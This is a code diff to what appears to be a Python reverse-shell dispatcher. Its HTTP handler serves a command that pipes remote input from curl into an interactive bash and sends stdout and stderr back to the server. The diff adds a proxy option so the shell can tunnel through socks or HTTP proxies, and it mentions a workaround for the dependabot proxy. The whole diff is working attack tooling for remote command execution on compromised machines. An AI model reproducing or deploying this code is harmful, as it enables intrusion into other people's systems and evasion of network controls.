@@ -150,14 +150,16 @@ class ConDispHTTPRequestHandler(BaseHTTPRequestHandler):
         locker("stdin", -1, not self.server.args.serve_forever)
         
     def do_GET(self):
-        
         eprint("cmd request received from", self.headers.get('X-Forwarded-For') or self.client_address)
         schema = self.headers['X-Forwarded-Proto']
         if not schema:
             schema = "https" if self.server.args.certificate else "http"
+        proxy = ""
+        if self.server.args.x:
+            proxy = "-x " + self.server.args.x
         host = self.headers["Host"]
-        cmd = f"stdbuf -i0 -o0 -e0 curl -X POST -sk {schema}://{host}/input"
-        cmd+= f" | bash 2> >(curl -sk -T - {schema}://{host}/stderr)"
+        cmd = f"stdbuf -i0 -o0 -e0 curl {proxy} -X POST -sk {schema}://{host}/input"
+        cmd+= f" | bash -il 2> >(curl -sk -T - {schema}://{host}/stderr)"
         cmd+= f" | curl -sk -T - {schema}://{host}/stdout"
         cmd+=  "\n"
         # sending back the complex command to be executed
@@ -207,4 +209,5 @@ if __name__ == "__main__":
     parser.add_argument("--listen-port", type=int, default=443, help="port to listen on")
     parser.add_argument("--serve-forever", default=False, action='store_true', help="whether the server should exit after processing a session (just like nc would)")
     parser.add_argument("--dependabot-workaround", action='store_true', default=False, help="transfer-encoding support in the dependabot proxy is broken, it rewraps the raw chunks. This is a workaround.")
+    parser.add_argument("-x", help="Proxy to use [e.g. -x socks5h://1.2.3.4:1080 or -x http://user:pwd@1.2.3.4:3128]")
     do_the_job(parser.parse_args())
